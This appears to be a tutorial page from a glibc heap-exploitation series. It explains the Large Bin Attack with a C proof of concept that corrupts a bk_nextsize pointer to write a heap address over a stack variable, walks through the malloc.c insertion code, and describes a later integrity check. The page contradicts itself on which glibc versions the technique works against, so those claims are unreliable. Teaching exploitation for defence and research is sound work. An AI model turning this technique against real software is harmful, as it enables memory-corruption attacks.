#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "Large Bin Attack",
    description: "Exploiting the Large Bin sorting logic to achieve an arbitrary write of a heap address.",
    date: "2025-12-26",
    order: 38,
  ),
)<frontmatter>

= glibc Allocator: Large Bin Attack

== Introduction

The "Large Bin Attack" is a heap exploitation technique that allows an attacker to write a heap address to an arbitrary location. It targets the logic used by the allocator when inserting a chunk into a *Large Bin*.

Unlike the Unsorted Bin attack, which writes a libc address, the Large Bin attack writes the address of the chunk being inserted (a heap address). This is achieved by corrupting the `bk_nextsize` pointer of a chunk already sitting in the Large Bin.

== Prerequisites
- *Large Bin Corruption*: Ability to overwrite the `bk_nextsize` pointer of a chunk while it is in a Large Bin.
- *Size Control*: Ability to allocate chunks of different sizes within the Large Bin range (typically > 0x400) to trigger specific sorting branches.
- *GLIBC Version*: Effective on glibc < 2.30. Newer versions include integrity checks for the `nextsize` list.

== Example Code

This PoC demonstrates how to use a Large Bin attack to overwrite a stack variable with a heap address.

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

/*
  Tested on glibc 2.31.
  Large bin attack allows writing a heap address to an arbitrary location.
*/

int main() {
    setbuf(stdout, NULL);

    unsigned long target = 0;
    printf("Target variable at %p. Current value: %p\n\n", &target, (void*)target);

    // 1. Allocate a large chunk and a barrier
    void *p1 = malloc(0x420); // Large enough for large bin
    malloc(0x20);             // Barrier 1

    // 2. Allocate a second large chunk and a barrier
    void *p2 = malloc(0x410); // Slightly smaller than p1
    malloc(0x20);             // Barrier 2

    // 3. Free p1 and move it to the large bin
    free(p1);
    malloc(0x500); // Trigger sorting: p1 moves to Unsorted Bin -> Large Bin

    // 4. Free p2. It is now in the Unsorted Bin.
    free(p2);

    // ------------ VULNERABILITY ------------
    /*
       We corrupt p1's metadata while it's in the Large Bin.
       We set bk_nextsize to (target - 0x20) because the allocator will
       perform: victim->bk_nextsize->fd_nextsize = victim
    */
    ((unsigned long*)p1)[3] = (unsigned long)(&target - 4);
    // ---------------------------------------

    // 5. Trigger sorting of p2
    // The allocator will try to insert p2 into the large bin containing p1.
    malloc(0x500);

    printf("After p2 is sorted, the target variable has been overwritten:\n");
    printf("%p: %p\n", &target, (void*)target);

    assert(target != 0);
}
```

== Attack Flow Explained

=== 1. Bin Setup

Large Bins are used for chunks larger than `0x400` bytes. Unlike Small Bins, Large Bins store chunks of different sizes, sorted in descending order. They use two additional pointers: `fd_nextsize` and `bk_nextsize`, which form a doubly-linked list of the first chunk of each size in the bin.

=== 2. Moving Chunks to Large Bin

We first move a chunk (`p1`) into the Large Bin. Then, we free a second chunk (`p2`) that belongs to the same Large Bin but is slightly smaller than `p1`. `p2` is currently in the Unsorted Bin.

=== 3. The Vulnerability: Corrupting bk_nextsize

We assume a vulnerability allows us to overwrite the `bk_nextsize` pointer of `p1`. We set it to `Target - 0x20` (on 64-bit, this is `Target - 4 * sizeof(long)`).

=== 4. The Insertion Logic

When `malloc()` triggers the sorting of `p2`, the allocator finds the correct Large Bin and traverses it to find the insertion point. Because `p2` is smaller than `p1`, the allocator reaches the end of the `nextsize` list (at `p1`).

The critical code in `malloc.c` is:

```c
victim->fd_nextsize = fwd;
victim->bk_nextsize = fwd->bk_nextsize;
fwd->bk_nextsize->fd_nextsize = victim; // THE CRITICAL WRITE
fwd->bk_nextsize = victim;
```

Here, `fwd` is `p1` and `victim` is `p2`.
The line `fwd->bk_nextsize->fd_nextsize = victim` effectively performs:
`*(p1->bk_nextsize + 0x20) = p2`

Since we set `p1->bk_nextsize` to `Target - 0x20`, this results in:
`*(Target) = p2`

Our `Target` variable is now overwritten with the heap address of `p2`.

== Modern Mitigations (glibc 2.30+)

In glibc 2.30, a check was added to verify the integrity of the `nextsize` list before insertion:

```c
if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))
    malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
```

Similar to the Unsorted Bin attack mitigation, this check ensures that the pointers in the list correctly point back to each other. If we corrupt `bk_nextsize`, this check will fail.

